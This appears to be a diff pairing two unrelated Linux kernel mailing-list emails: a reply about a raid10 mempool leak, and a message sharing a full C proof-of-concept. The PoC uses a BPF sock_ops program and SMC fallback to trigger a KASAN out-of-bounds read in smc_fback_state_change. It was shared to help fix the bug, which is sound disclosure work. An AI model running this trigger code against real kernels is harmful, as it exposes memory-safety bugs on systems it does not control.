@@ -1,170 +1,223 @@
-Received: from mail-wm1-f47.google.com (mail-wm1-f47.google.com [209.85.128.47])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from out203-205-221-164.mail.qq.com (out203-205-221-164.mail.qq.com [203.205.221.164])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 824BB28C874
-	for <sashiko-reviews@lists.linux.dev>; Sun, 21 Jun 2026 11:05:58 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.47
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 702511A680E
+	for <sashiko-reviews@lists.linux.dev>; Sun, 21 Jun 2026 11:28:42 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.164
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782039960; cv=none; b=GZ29FUyR90UN94+/YmRzZqaqP4EJU9hmPSTlLSYoYIlOkpvVkr5MXi9i/+xfYFHauXxLxPIfdkbT0xbyurAGvCA4TqR+/E2IeyEwW6S/j361sTtwLrJ14Zt5KC9A+BHadfClkSnj+jrboLVaL+knHdB2LSxpv27TJQef5ilDYqk=
+	t=1782041325; cv=none; b=hSe3etbvz76d8RVunimZbUcoFjOMxOM+c9l7rr//ppXA9i2ecGDgR94pAg1JAwKWiJ/gythbkeX5EZjjwZQv4L3svdNNHbuuMaO99Mfn7Vk15FF5Geq1hP4K3E4MLH9Mmc1Gsmi/O88wNuc5t5a5lqOQ4eRnnaIllJkwLMXrREw=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782039960; c=relaxed/simple;
-	bh=S8g+Yb4LC3835NdJW21zFgho7+utbXRp9nSrlT2Nuro=;
-	h=From:To:Cc:Subject:In-Reply-To:References:Date:Message-ID:
-	 MIME-Version:Content-Type; b=JlyFCWZdXyddIJet8N8wvbIRa/HlPNOptSL8M0Ov8LTAXb8gw2Fq0JccvYMWphGEVgTVRsSr2E7pc1bA2aKcnPEwKGznyVA7GYH968y9Et0j26chZJD1qt6lYACWHt1qldExvZTDD2qP2FFiLzf/badjIPQYP4JCRhCb5vJ6YHs=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=OFUhBbDr; arc=none smtp.client-ip=209.85.128.47
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1782041325; c=relaxed/simple;
+	bh=rL57JaiUOHC1qiFgtgpKHdCLa1ymbOoJzTz01KqUKYE=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=XdN3S9JKIEqKsddCFVFXv3DvSsd2lImGuiuX3xY6drUj6NtT9rXdhWhpHakCsCHx3z3sty2GtMLNQPhtILVbtTKis71XQHgpmCLxl81MEwfeEQl55UkjpgF745pIsiELX8vH5LQ9CJhynswzyZdbSKcW7e2LIMkukz+ilqH46bQ=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=uF53iXao; arc=none smtp.client-ip=203.205.221.164
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="OFUhBbDr"
-Received: by mail-wm1-f47.google.com with SMTP id 5b1f17b1804b1-490b211ee6aso23453045e9.3
-        for <sashiko-reviews@lists.linux.dev>; Sun, 21 Jun 2026 04:05:58 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1782039957; x=1782644757; darn=lists.linux.dev;
-        h=content-transfer-encoding:mime-version:message-id:date:references
-         :in-reply-to:subject:cc:to:from:from:to:cc:subject:date:message-id
-         :reply-to;
-        bh=P6qCbctGU9YtgCNvyYnx6Q2LOX2NS4PdIhxDYYp5m4k=;
-        b=OFUhBbDrXzzbTmpDlIS9BCFrwUDEOBFM+6zk2KKoHJfQVrSjvErf0PEVJw8/uCM3jS
-         xoOCg7HTlS3rUs5wbwHoAXwpM0GC8P8dfFmGFNMqOzRJpLsD9ubPybRk0sq/0V3E1jPP
-         Dc20S5PZOLq/nYRF551VnTyDIYkDo7zdqNidadkEH/bppjx1r91OKevj/+RyHqm6y3pO
-         yrLsZ4wHNK/9wFwszFWDXgdz7AbXNqtW7qKTmHTpphDYXNNewgNQ62Tzjcl+0iZWsM/G
-         OfqkbmmeM+nT50IQSKTGw298Bw6NW0EfX6tSJUud0i4v4BQlckT6YXHkwgeR07P6/CzD
-         r0ow==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1782039957; x=1782644757;
-        h=content-transfer-encoding:mime-version:message-id:date:references
-         :in-reply-to:subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to
-         :cc:subject:date:message-id:reply-to;
-        bh=P6qCbctGU9YtgCNvyYnx6Q2LOX2NS4PdIhxDYYp5m4k=;
-        b=PKnj4vVapwA8mDq2Pj4tgIUnsR3vBGGjyhEdJKBx1Q6vTlxxdniATL76L0nC1ifUSe
-         KvUzcgcFnAg45ul6HYRSwjDzTHwj5aW8oqFIVNOuh4/eXr+VhJ+n6tBqsW5xjvqqYeI9
-         NLaMCCZLO7tKlaJJt3lY3SznAplpbjJkHX+TwnylUvDDjzBBju1B/8SEXO3Q3qmeRuS7
-         ZvqFhW/Q8TW+mBdwc6IgRXglL/cI6NSI91wh92nofcYntjXFc9om0cz3jO+fkRsj1XTK
-         yWULYEuRZ3V1JCRJlHtgUWM5xavEK5Q6AFhAgggem/kCOB8/b7mYH0pE6OV64KjJe2M9
-         VmNg==
-X-Forwarded-Encrypted: i=1; AFNElJ++QHDeTiBo4HDzfzx4gWbXqddls6g/ejfuacr46PQrShJAIkOhODLUx/GRdrWTKeVVtyGUuZeILJBPQFZfRL8=@lists.linux.dev
-X-Gm-Message-State: AOJu0Yzvq2p9vZea4/+YmbrkAXcr3C3BSi84Y3EH2JqoBLANkrwxPZwt
-	4ezSXfcHXIocRlE4jPzF6BQTg84b8d1Zhyv4BXjdw7iwgh7ZGYaCJemR
-X-Gm-Gg: AfdE7ckLjLIVzSfzBmDuSy+yH4o9vZtusKKgf0WCLpBSPo+uKi4vnKLF9i/vMMlSZNU
-	zn6Z27vlbqa742z6z8sGDSSMKQi6TY9lgqpoa9uqpFQgUaCnBOIcSl8rm6eFSlpafsgI5skY0qg
-	swaPCQZclwVJGb1kActF5wmhbr/sQuGP7Eq4CRUZL3d13EG/RhJxku1ME7xSpMkNLeN8RouWsCb
-	R9i3MdIZMCJs0bhI5cWz+qPJnSKusxuiqbayVsB6h1iv1jp+itpy9hbZorjyC1yutej3OKjk3PX
-	TQZf+ZENl3PXq4zQMB3vI/MHPrppXWD8TdKM/+s7hhLwPVQssJmUepAZQ4/5kIo+SBcQu19nnaD
-	F2YSgSen0hy1JxK6bcNXv+sR88YzskuejcJ+kLxBRcoNAWs5Qmq28w2jgVpCBmrnft7kkU0KLP+
-	CzNpM3E6Ws0PQjRzxv4TxpI8wI5K5uVutatmnMv3G/2GJZ5QIFNygph9w=
-X-Received: by 2002:a05:600c:3507:b0:492:433a:53af with SMTP id 5b1f17b1804b1-492433a552bmr156437115e9.16.1782039956683;
-        Sun, 21 Jun 2026 04:05:56 -0700 (PDT)
-Received: from Abds-MacBook-Air.local ([2a02:3037:615:2c89:25c9:4e1a:3e26:ebb0])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-49240084928sm219169335e9.15.2026.06.21.04.05.55
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 21 Jun 2026 04:05:56 -0700 (PDT)
-From: Abd-Alrhman Masalkhi <abd.masalkhi@gmail.com>
-To: yu kuai <yukuai@fygo.io>, sashiko-reviews@lists.linux.dev
-Cc: linux-raid@vger.kernel.org, yukuai@fygo.io
-Subject: Re: [PATCH v2 2/4] md/raid10: fix writes_pending leak on write
- request failures
-In-Reply-To: <ecaef394-23a2-43ec-a85b-2e25786914aa@fygo.io>
-References: <20260613182810.1317258-3-abd.masalkhi@gmail.com>
- <20260613184042.BCEC01F000E9@smtp.kernel.org>
- <ecaef394-23a2-43ec-a85b-2e25786914aa@fygo.io>
-Date: Sun, 21 Jun 2026 13:05:46 +0200
-Message-ID: <m21pe02lx1.fsf@gmail.com>
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="uF53iXao"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1782041314; bh=DmBi3wOFGWxORVVzo7KUN8GyCSjx2r5ZHl6IleBQF/g=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To;
+	b=uF53iXaoco/1dbOHPJVUPGr+cJ92GDL7vJzsXLqVJh2tpv88Tpq4tSHCaQ92FcJfT
+	 yYLLNjUzbjd9CCnWYGQiHCZQcRFtiOfGhe1dSCeX7x+uOIVIDV9nuOmoTuJQf4T1ou
+	 qnfVfD1pn7RFoCJxKjxkow8B7oxx+d98JmAUaPA0=
+Received: from [192.168.3.157] ([115.156.144.140])
+	by newxmesmtplogicsvrszc56-0.qq.com (NewEsmtp) with SMTP
+	id 71F8266D; Sun, 21 Jun 2026 19:28:31 +0800
+X-QQ-mid: xmsmtpt1782041311tvb4danci
+Message-ID: <tencent_8E5C38BD467714A73238DE9E6454646EC407@qq.com>
+X-QQ-XMAILINFO: N/WmRbclY25Ge55ZC1eeD+AYUgzLz0niYmsJ3IlPW9CdTYjvaKSiMB03AI4kHo
+	 NxPqWeNeOakjwjneUJYjA2te6DbzNMHrXKnJSQ2mC9EIOkvhqTZJzAmOhYpbqs1BuLkhk1M+40sg
+	 zQih5KUPIso/iyxdwdAzsazPNkV0hJmfzGlVjLYE3MCWFYVOoYFZUmV81nP1bZacce4UjL20dilG
+	 wTZTr3E+zQRGA0BxgRwowPq3cGRIXqIwybXBhn/OyPzkS5aVlDprKBRkT9SmmrBiEQmP5gZhm739
+	 bE8rkA+eFKwMLOO+RdNuCMaEQKmdNNxoGTFpzpw2Pmu6LzqTevfpSGrDaUjXueCDbObIammyM6N/
+	 LI0z56akNEuETYE29qW34E8705qzm/t1GUng96ag+qMQiATFunpnGAZCCJtTjwebNkS0nrwkTXpg
+	 cWT92/Bsts5bIV39sGW+1k1AwKgF5TocMoKHZvVUQdhAAOlHnHepPDSDw05mYrnp8ONb3cmVzNw3
+	 5yIx6L/tdYyL+m5TWSnSno+KWW3iIIbjoS6L5E2EZT9oUBGXHMJfbyNPfTKaGsueWy6iE4YXUJX3
+	 Lq44NDubFHJRBGhlH3JO7kN6k2HkConz062Qz5PYU67dLotpKH0NsZqXQ1AQNQX5NiCU2Utd+ksC
+	 gh61tTNtElfX/zMZX4vImrL1GN1eA6Ei8gG12qbIIq+wJiNB4nZgWIx05vl80m84P0jmqzFMKRk6
+	 tfJlnL9u9VJX1Lfh7IC+ulItulsCqX44Wzbz4V2iCJSdw6vywLqTVot+q+6tS2QK4jZTr2UMyvVY
+	 CaKaJKLsCm3bj+iEj8/OGa9dQoB7nBX020Q+8IoO23jRtXpw65zyENMvpyGb8Vc5Kotq1ry48t7i
+	 oWa04ZNYATLh/ZNlI22O057SZVJQlQoL4dInlBv2EWzGibzGUgTTYfo/KBYr0tWM/fNfozRfcUUX
+	 567Cgz5DyEhaGopu8Q6DzVfQEkCuk+yAUwer6u2vDo3OrAN1C51HGkqASTH0oplkt2NjRZ99I6XM
+	 X0BkEE0n2LVAfUbKrI7NOtEGvRUHzx1JVlHa9zCuy9gGGRnFRpPAXdBx0Gkd5egpfAF8xsCNGNhF
+	 ReqqCc
+X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
+X-OQ-MSGID: <84741f7e-057a-4f34-883b-e2a3af1a6f20@qq.com>
+Date: Sun, 21 Jun 2026 19:28:29 +0800
 Precedence: bulk
 X-Mailing-List: sashiko-reviews@lists.linux.dev
 List-Id: <sashiko-reviews.lists.linux.dev>
 List-Subscribe: <mailto:sashiko-reviews+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:sashiko-reviews+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH net] net/smc: fix out-of-bounds read in
+ smc_clcsock_data_ready()
+To: sashiko-reviews@lists.linux.dev, Sechang Lim <rhkrqnwk98@gmail.com>
+Cc: Vasily Gorbik <gor@linux.ibm.com>,
+ Alexander Gordeev <agordeev@linux.ibm.com>, linux-s390@vger.kernel.org,
+ bpf@vger.kernel.org, Heiko Carstens <hca@linux.ibm.com>
+References: <20260614120931.4041687-1-rhkrqnwk98@gmail.com>
+ <20260615120954.99EA21F000E9@smtp.kernel.org>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <20260615120954.99EA21F000E9@smtp.kernel.org>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
+  Hi Sechang,
 
-Hi Kaui,
+I saw your v2 is coming — before you send it, I wanted to share a PoC
+that triggers the `smc_fback_state_change` callback OOB that the Sashiko
+review flagged.
 
-On Sun, Jun 21, 2026 at 02:25 +0800, yu kuai wrote:
-> Hi,
->
-> =E5=9C=A8 2026/6/14 2:40, sashiko-bot@kernel.org =E5=86=99=E9=81=93:
->> Thank you for your contribution! Sashiko AI review found 1 potential iss=
-ue(s) to consider:
->>
->> Pre-existing issues:
->> - [High] The `r10_bio` structure allocated from the mempool is leaked wh=
-en `raid10_write_request()` bails out early due to `REQ_NOWAIT`.
->> --
-> This looks like a real issue, do you plan to fix this as well?
+Your patch restores `child->sk_data_ready`, but the other three fallback
+callbacks (`sk_state_change`, `sk_write_space`, `sk_error_report`)
+installed by `smc_fback_replace_callbacks()` remain inherited from the
+listen socket and read the child's `sk_user_data` as an `smc_sock`.
 
-Yes, I plan to fix that issue as well. I'll include this fix along with
-the other patches.
+I confirmed this by loading a BPF sock_ops program that calls
+`bpf_sock_hash_update()` on the child socket, then sending data. The
+BPF helper populates `sk_user_data` with a `sk_psock`, and the inherited
+`smc_fback_state_change` misreads it.
 
->>
->> commit 3940ccdb4c7c7e19c20f9b5e2e1d12545c2558b5
->> Author: Abd-Alrhman Masalkhi <abd.masalkhi@gmail.com>
->>
->> md/raid10: fix writes_pending leak on write request failures
->>
->> raid10_make_request() acquires a writes_pending reference with
->> md_write_start() before dispatching write requests. Several failure
->> paths in raid10_write_request() complete the bio and return without
->> reaching the normal write completion path, causing the corresponding
->> md_write_end() to be skipped.
->>
->>> diff --git a/drivers/md/raid10.c b/drivers/md/raid10.c
->>> index cee5a253a281d..c123a8c76ddcd 100644
->>> --- a/drivers/md/raid10.c
->>> +++ b/drivers/md/raid10.c
->> [ ... ]
->>> @@ -1365,7 +1365,7 @@ static void raid10_write_request(struct mddev *md=
-dev, struct bio *bio,
->>>   		/* Bail out if REQ_NOWAIT is set for the bio */
->>>   		if (bio->bi_opf & REQ_NOWAIT) {
->>>   			bio_wouldblock_error(bio);
->>> -			return;
->>> +			return false;
->> [Severity: High]
->> This isn't a bug introduced by this patch, but does this early return le=
-ak
->> the r10_bio structure?
->>
->> __make_request() allocates r10_bio using:
->>      r10_bio =3D mempool_alloc(&conf->r10bio_pool, GFP_NOIO);
->>
->> It then passes it to raid10_write_request(). When the bio has REQ_NOWAIT=
- set
->> during a clustered area resync, we complete the bio with an error and re=
-turn
->> false without freeing the r10_bio. Could repeatedly triggering this exha=
-ust
->> the r10bio_pool, causing deadlocks on subsequent operations?
->>
->> Note that the regular_request_wait() error path right below correctly ca=
-lls
->> free_r10bio(r10_bio) before returning.
->>
->>>   		}
->>>   		for (;;) {
->> [ ... ]
->>> @@ -1398,7 +1398,7 @@ static void raid10_write_request(struct mddev *md=
-dev, struct bio *bio,
->>>   		if (bio->bi_opf & REQ_NOWAIT) {
->>>   			allow_barrier(conf);
->>>   			bio_wouldblock_error(bio);
->>> -			return;
->>> +			return false;
->> [Severity: High]
->> This is a pre-existing issue, but does this path also leak the r10_bio
->> mempool allocation when waiting for a reshape metadata update?
->>
->> Similar to the clustered area resync case above, the r10_bio allocated in
->> __make_request() does not appear to be freed before returning here.
->>
->>>   		}
->>>   		mddev_add_trace_msg(conf->mddev,
->
-> --=20
-> Thanks,
-> Kuai
+[KASAN report — kernel 7.1.0-rc7-next-20260612, CONFIG_KASAN=y]
 
---=20
-Best Regards,
-Abd-Alrhman
+   BUG: KASAN: slab-out-of-bounds in smc_fback_state_change+0xb4/0xc0
+
+   Call Trace:
+    <TASK>
+    smc_fback_state_change+0xb4/0xc0
+    ...
+    bpf_prog_... → bpf_sock_hash_update → sock_hash_update_common
+      → sock_map_link → sk_psock_init
+
+Full PoC (poc.c):
+---8<----------------------------------------------------------------
+/*
+  * PoC: OOB read in smc_fback_state_change
+  *
+  * Trigger: force SMC fallback -> listen -> BPF sock_ops attaches
+  * sk_psock via bpf_sock_hash_update() -> inherited smc_fback_state_change
+  * misreads sk_psock as smc_sock -> KASAN OOB.
+  *
+  * gcc -o poc poc.c
+  */
+#include <errno.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mount.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <linux/bpf.h>
+
+#ifndef __NR_bpf
+#define __NR_bpf 321
+#endif
+
+static int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
+{ return syscall(__NR_bpf, cmd, attr, size); }
+
+static int create_sockhash(void)
+{
+     union bpf_attr attr = { .map_type = 15 /*BPF_MAP_TYPE_SOCKHASH*/,
+         .key_size = 4, .value_size = 8, .max_entries = 64 };
+     return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
+}
+
+static int load_prog(int map_fd)
+{
+     struct bpf_insn prog[] = {
+         /* r2 = *(u32 *)(r1 + 0) */
+         {0x61, 2, 1, 0, 0},
+         /* if r2 != 2 (BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB) goto +8 */
+         {0x55, 2, 0, 8, 2},
+         /* *(u32 *)(r10 - 8) = 1 */
+         {0x62, 10, 0, -8, 1},
+         /* r3 = r10; r3 += -8 */
+         {0xbf, 3, 10, 0, 0}, {0x07, 3, 0, 0, -8},
+         /* r4 = 0 */
+         {0xb4, 4, 0, 0, 0},
+         /* r2 = map_fd (2 insns) */
+         {0x18, 2, 0, 0, map_fd}, {0, 0, 0, 0, 0},
+         /* call 70 (bpf_sock_hash_update) */
+         {0x85, 0, 0, 0, 70},
+         /* r0 = 0; exit */
+         {0xb7, 0, 0, 0, 0}, {0x95, 0, 0, 0, 0},
+     };
+     union bpf_attr attr = { .prog_type = 8 /*BPF_PROG_TYPE_SOCK_OPS*/,
+         .insns = (__u64)(unsigned long)prog, .insn_cnt = 
+sizeof(prog)/sizeof(prog[0]),
+         .license = (__u64)(unsigned long)"GPL" };
+     return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+}
+
+static int setup_cgroup(int prog_fd)
+{
+     mkdir("/sys/fs/cgroup", 0755);
+     mount("none", "/sys/fs/cgroup", "cgroup2", 0, NULL);
+     mkdir("/sys/fs/cgroup/poc", 0755);
+     int cg_fd = open("/sys/fs/cgroup/poc", O_DIRECTORY|O_RDONLY);
+     union bpf_attr attr = { .attach_type = 34 /*BPF_CGROUP_SOCK_OPS*/,
+         .target_fd = cg_fd, .attach_bpf_fd = prog_fd };
+     bpf(BPF_PROG_ATTACH, &attr, sizeof(attr));
+     int procs_fd = openat(cg_fd, "cgroup.procs", O_WRONLY);
+     char buf[32]; int len = snprintf(buf, sizeof(buf), "%d\n", getpid());
+     write(procs_fd, buf, len);
+     close(procs_fd); close(cg_fd);
+     return 0;
+}
+
+int main(void)
+{
+     struct sockaddr_in addr = { .sin_family = AF_INET,
+         .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
+     socklen_t addrlen = sizeof(addr);
+     int optval = 1;
+
+     int map_fd = create_sockhash();
+     int prog_fd = load_prog(map_fd);
+     setup_cgroup(prog_fd);
+
+     int smc_fd = socket(AF_SMC, SOCK_STREAM, 0);
+     setsockopt(smc_fd, SOL_TCP, TCP_FASTOPEN, &optval, sizeof(optval));
+     bind(smc_fd, (struct sockaddr *)&addr, sizeof(addr));
+     getsockname(smc_fd, (struct sockaddr *)&addr, &addrlen);
+     listen(smc_fd, 5);
+
+     pid_t pid = fork();
+     if (pid == 0) {
+         usleep(100000);
+         int cfd = socket(AF_INET, SOCK_STREAM, 0);
+         connect(cfd, (struct sockaddr *)&addr, sizeof(addr));
+         send(cfd, "hello", 5, 0);
+         usleep(300000); close(cfd); _exit(0);
+     }
+
+     int new_fd = accept(smc_fd, NULL, NULL);
+     if (new_fd >= 0) { char buf[64]; read(new_fd, buf, sizeof(buf)-1); 
+close(new_fd); }
+     waitpid(pid, NULL, 0);
+     close(smc_fd); close(prog_fd); close(map_fd);
+     printf("[+] Done. Check dmesg.\n");
+     return 0;
+}
+---8<----------------------------------------------------------------
+Compile: gcc -o poc poc.c
+
+[1] 
+https://sashiko.dev/#/patchset/20260614120931.4041687-1-rhkrqnwk98%40gmail.com
+
+Thanks,
+XIAO
+
